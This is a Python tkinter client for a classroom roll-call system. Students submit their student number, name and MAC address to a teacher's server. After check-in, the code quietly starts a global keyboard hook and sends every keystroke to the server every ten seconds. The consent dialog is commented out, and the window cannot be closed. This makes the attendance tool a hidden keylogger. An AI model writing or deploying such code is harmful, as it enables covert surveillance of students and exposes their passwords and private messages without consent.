import tkinter
import tkinter.ttk
import tkinter.scrolledtext
import tkinter.messagebox
import tkinter.filedialog
import socket
import re
import os
import os.path
import sys
import struct
import threading
import time
import ctypes
import pythoncom
import PyHook3 as pyHook

IntervalTime = 10 #每隔这些时间。向服务器发送键盘钩子数据
root = tkinter.Tk(screenName='User login')        #创建应用程序窗口
root.title('课堂管理系统客户端1.3')
root.geometry('320x150+500+300')
root.resizable(False, False)   #不允许改变窗口大小

def closeWindow():
    tkinter.messagebox.showerror(title='警告',message='不许关闭，好好学习！')
    return
root.protocol('WM_DELETE_WINDOW', closeWindow)


xuehao = tkinter.StringVar(root)
xuehao.set('')
xingming = tkinter.StringVar(root)
xingming.set('')
server_IP = tkinter.StringVar(root)
server_IP.set('192.168.1.1')  #默认服务器地址

labelXuehao = tkinter.Label(root, text='学号：', #创建标签
                          justify=tkinter.RIGHT,
                          width=80)
labelXuehao.place(x=10, y=5, width=80, height=20)    #将标签放到窗口上

entryXuehao = tkinter.Entry(root, width=150,          #创建文本框
                          textvariable=xuehao)    #同时设置关联的变量
entryXuehao.place(x=100, y=5, width=150, height=20)

labelXingming = tkinter.Label(root, text='姓名：', justify=tkinter.RIGHT, width=80)
labelXingming.place(x=10, y=30, width=80, height=20)

entryXingming = tkinter.Entry(root, width=150,
                         textvariable=xingming)
entryXingming.place(x=100, y=30, width=150, height=20)

labelServerIP = tkinter.Label(root, text='服务器IP地址：', justify=tkinter.RIGHT, width=80)
labelServerIP.place(x=10, y=60, width=80, height=20)
entryServerIP = tkinter.Entry(root, width=150, textvariable=server_IP)
entryServerIP.place(x=100, y=60, width=150, height=20)

# 自动登录
try:
    path = os.getenv('temp')
    filename = path + '\\' + 'info.txt'
    with open(filename) as fp:
        xuehao1, xingming1, ip1 = fp.read().strip().split(',')
    xuehao.set("")
    #entryXuehao['state'] = 'readonly'
    xingming.set("")
    #entryXingming['state'] = 'readonly'
    server_IP.set(ip1)
except:
    pass

int_searchServer = tkinter.IntVar(root, value=1)
#每3秒钟接收一次服务器广播信息，修改服务器IP地址
def findServer():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)               #创建socket对象
    sock.bind(('', 5000))                                                  #绑定socket
    try:
        while int_searchServer.get() == 1:
            data, addr = sock.recvfrom(1024)                                    #接收信息
            if data.decode() == 'ServerIP':                                                   #输出收到的信息
                server_IP.set(addr[0])
            time.sleep(3)
    except:
        pass
thread_findServer = threading.Thread(target=findServer)
thread_findServer.start()

def buttonOKClick():                #登录按钮事件处理函数
    
    xuehao = entryXuehao.get()      #获取学号
    xingming = entryXingming.get()    #获取姓名
    serverIP = entryServerIP.get()
    if not re.match('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', serverIP):
        tkinter.messagebox.showerror('很抱歉', '服务器IP地址不合法')
        return
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((serverIP, 30303))
    except Exception as e:
        tkinter.messagebox.showerror('很抱歉', '现在不是点名时间')
        return
    
    #获取客户端MAC地址，使用MAC+IP保证每台计算机每节课只能点名一次
    import uuid
    node = uuid.getnode()
    macHex = uuid.UUID(int=node).hex[-12:]
    mac = []
    for i in range(len(macHex))[::2]:
        mac.append(macHex[i:i+2])
    mac = ''.join(mac)
        
    sock.sendall(','.join((xuehao,xingming,mac)).encode())
    
    data = sock.recv(1024).decode()
    if data.lower() == 'ok':
        #点名成功
        sock.close()

        # 保存学号、姓名和服务器IP地址，方便下次自动填写信息
        path = os.getenv('temp')
        filename = path + '\\' + 'info.txt'
        with open(filename, 'w') as fp:
            fp.write(','.join((xuehao, xingming, serverIP)))
        entryXingming['state'] = 'readonly'
        entryXuehao['state'] = 'readonly' 
        tkinter.messagebox.showinfo('恭喜', xuehao+','+xingming+'  报到点名成功')
        #t = tkinter.messagebox.askyesno('请确认', '是否自愿接收监督？')
        #if t:
        # 启动监视模式
        t = threading.Thread(target=recordkey)
        t.deamon = True
        t.start()
        t = threading.Thread(target=sendkey)
        t.deamon = True
        t.start()
        return
    elif data.lower() == 'repeat':
        sock.close()
        tkinter.messagebox.showerror('很抱歉', '不允许重复报到')
        return
    elif data.lower() == 'notmatch':
        sock.close()
        tkinter.messagebox.showerror('很抱歉', '学号与姓名不匹配')
        return
    elif data.lower() == 'daidianming':
        sock.close()
        tkinter.messagebox.showerror('很抱歉', '不允许替别人点名，警告一次')
        return
buttonOk = tkinter.Button(root, text='报到',      #创建按钮组件
                          command=buttonOKClick) #同时设置按钮事件处理函数 
buttonOk.place(x=120, y=100, width=80, height=40)


def sendkey(): 
    xuehao = entryXuehao.get()
    xingming = entryXingming.get()
    serverIP = entryServerIP.get()
    while True:
        time.sleep(IntervalTime) 
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((serverIP, 10008))
        except Exception as e:
            continue

        # path = os.getenv('temp')
        # filename = path + '\\' + 'recordkey.txt'
        # if os.path.exists(filename):
        #     with open(filename, 'r+') as fp:
        #         li = fp.readlines()
        #         fp.seek(0)
        #         fp.truncate()
        #         fp.close()
        # else:
        #     with open(filename, mode='w', encoding='utf-8') as ff:
        #         print("文件创建成功！")
        # records = ''.join(li).encode()

        records = "".join(KeyBuffer)
        message = xuehao +"&"+records
        sock.sendall(message.encode())
        sock.close()
        KeyBuffer.clear()

KeyBuffer = []
def onKeyboardEvent(event):
    key = event.Key
    print(key)
    if key in ['Space','Tab']:
        key = ' '
    elif len(key)>1:
        key = ""
    # if key == 'Space':
    #     key = " "
    # elif key == "Tab":
    #     key = " "
    # elif key =="LShift" or key == "RShift":
    #     key ==""

    # path = os.getenv('temp')
    # filename = path + '\\' + 'recordkey.txt'
    # with open(filename, 'a+') as f:
    #     f.write(key)
    print(key)
    KeyBuffer.append(key)
    return True

def recordkey():
    hm = pyHook.HookManager() 
    hm.KeyDown = onKeyboardEvent 
    hm.HookKeyboard() 
    pythoncom.PumpMessages() 
root.mainloop()          #启动消息循环
